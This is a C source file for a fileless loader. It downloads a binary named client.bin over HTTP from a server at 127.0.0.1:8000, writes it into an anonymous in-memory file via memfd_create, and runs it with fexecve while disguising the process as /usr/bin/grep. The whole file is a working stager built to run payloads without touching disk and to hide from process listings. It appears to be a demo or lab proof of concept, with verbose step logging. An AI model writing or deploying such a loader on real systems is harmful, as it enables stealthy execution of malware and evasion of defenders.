#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>

#define MAX_FILESIZE 1024 * 1024 * 100  // 100 MB max file size
#define FAKE_CMDPATH "/usr/bin/grep"     // Disguise as grep
#define MEMFD_FDNAME "initd"             // Name for in-memory file
#define BUFFER_SIZE 4096                 // Buffer for downloading

#define __NR_memfd_create 319
#define MFD_CLOEXEC 1

extern char **environ;

static inline int memfd_create(const char *name, unsigned int flags)
{
    return syscall(__NR_memfd_create, name, flags);
}

int download_and_execute()
{
    int fd = -1, sock = -1;
    struct sockaddr_in server;
    char request[] = "GET /client.bin HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n";
    char buffer[BUFFER_SIZE];
    size_t total_size = 0;

    printf("Step 1: Creating in-memory file descriptor...\n");
    fd = memfd_create(MEMFD_FDNAME, MFD_CLOEXEC);
    if (fd < 0) {
        perror("Error creating in-memory file");
        return 1;
    }
    printf("Step 1: Success - In-memory FD created (fd=%d)\n", fd);

    printf("Step 2: Creating socket...\n");
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Error creating socket");
        goto cleanup;
    }
    printf("Step 2: Success - Socket created (sock=%d)\n", sock);

    printf("Step 3: Setting up server address (127.0.0.1:8000)...\n");
    server.sin_family = AF_INET;
    server.sin_port = htons(8000);
    if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) <= 0) {
        perror("Error setting server address");
        goto cleanup;
    }
    printf("Step 3: Success - Server address set\n");

    printf("Step 4: Connecting to server...\n");
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Error connecting to server");
        goto cleanup;
    }
    printf("Step 4: Success - Connected to server\n");

    printf("Step 5: Sending HTTP GET request...\n");
    if (send(sock, request, strlen(request), 0) < 0) {
        perror("Error sending request");
        goto cleanup;
    }
    printf("Step 5: Success - Request sent\n");

    printf("Step 6: Receiving response from server...\n");
    int headers_skipped = 0;
    while (1) {
        ssize_t bytes_received = recv(sock, buffer, BUFFER_SIZE, 0);
        if (bytes_received <= 0) {
            if (bytes_received < 0) {
                perror("Error receiving data");
                goto cleanup;
            }
            printf("Step 6: Done - No more data to receive (total bytes=%zu)\n", total_size);
            break;
        }

        if (!headers_skipped) {
            printf("Step 6a: Processing headers...\n");
            char *body_start = strstr(buffer, "\r\n\r\n");
            if (body_start) {
                body_start += 4;
                size_t header_len = body_start - buffer;
                size_t body_len = bytes_received - header_len;
                write(fd, body_start, body_len);
                total_size += body_len;
                headers_skipped = 1;
                printf("Step 6a: Success - Headers skipped, wrote %zu bytes\n", body_len);
            }
        } else {
            write(fd, buffer, bytes_received);
            total_size += bytes_received;
            printf("Step 6b: Wrote %zd bytes to memory (total=%zu)\n", bytes_received, total_size);
        }

        if (total_size > MAX_FILESIZE) {
            fprintf(stderr, "Error: Downloaded file exceeds %d bytes\n", MAX_FILESIZE);
            goto cleanup;
        }
    }

    printf("Step 7: Closing socket...\n");
    close(sock);
    sock = -1;
    printf("Step 7: Success - Socket closed\n");

    printf("Step 8: Forking to execute in-memory file...\n");
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("Error creating pipe for child output");
        goto cleanup;
    }

    pid_t pid = fork();
    if (pid == 0) {  // Child process
        close(pipefd[0]);  // Close read end of pipe

        // Redirect stdout and stderr to the pipe
        if (dup2(pipefd[1], STDOUT_FILENO) == -1) {
            perror("Error redirecting stdout in child");
            exit(errno);
        }
        if (dup2(pipefd[1], STDERR_FILENO) == -1) {
            perror("Error redirecting stderr in child");
            exit(errno);
        }
        close(pipefd[1]);  // Close write end after duplication

        char *argv[2] = {FAKE_CMDPATH, NULL};
        printf("Step 8: Child - Executing in-memory file (fd=%d)...\n", fd);
        if (fexecve(fd, argv, environ) == -1) {
            fprintf(stderr, "Child: fexecve failed with errno=%d: %s\n", errno, strerror(errno));
            exit(errno);
        }
        // fexecve does not return on success, so no code executes here if successful
    } else if (pid > 0) {  // Parent process
        close(pipefd[1]);  // Close write end of pipe

        // Read and display child process output
        char buf[1024];
        ssize_t bytes_read;
        printf("Step 8: Parent - Capturing child process output:\n");
        while ((bytes_read = read(pipefd[0], buf, sizeof(buf) - 1)) > 0) {
            buf[bytes_read] = '\0';  // Null-terminate for printing
            printf("Child output: %s", buf);
        }
        if (bytes_read == -1) {
            perror("Error reading child output");
        }
        close(pipefd[0]);  // Close read end of pipe

        // Wait for child and analyze exit status
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            int exit_code = WEXITSTATUS(status);
            printf("Step 8: Parent - Child process exited with code %d\n", exit_code);
            if (exit_code != 0) {
                printf("Step 8: Parent - Child failed (non-zero exit code indicates error)\n");
            } else {
                printf("Step 8: Parent - Child completed successfully\n");
            }
        } else if (WIFSIGNALED(status)) {
            printf("Step 8: Parent - Child process terminated by signal %d (%s)\n",
                   WTERMSIG(status), strsignal(WTERMSIG(status)));
        } else {
            printf("Step 8: Parent - Child process ended abnormally\n");
        }
    } else {  // Fork failed
        perror("Error forking process");
        close(pipefd[0]);
        close(pipefd[1]);
        goto cleanup;
    }

    printf("Step 9: Closing in-memory FD...\n");
    close(fd);
    printf("Step 9: Success - Cleaned up\n");
    return 0;

cleanup:
    if (fd > 0) {
        printf("Cleanup: Closing in-memory FD (%d)\n", fd);
        close(fd);
    }
    if (sock > 0) {
        printf("Cleanup: Closing socket (%d)\n", sock);
        close(sock);
    }
    return 1;
}

int main()
{
    printf("Starting loader to download and execute client.bin...\n");
    int result = download_and_execute();
    if (result == 0) {
        printf("Loader completed successfully\n");
    } else {
        printf("Loader failed\n");
    }
    return result;
}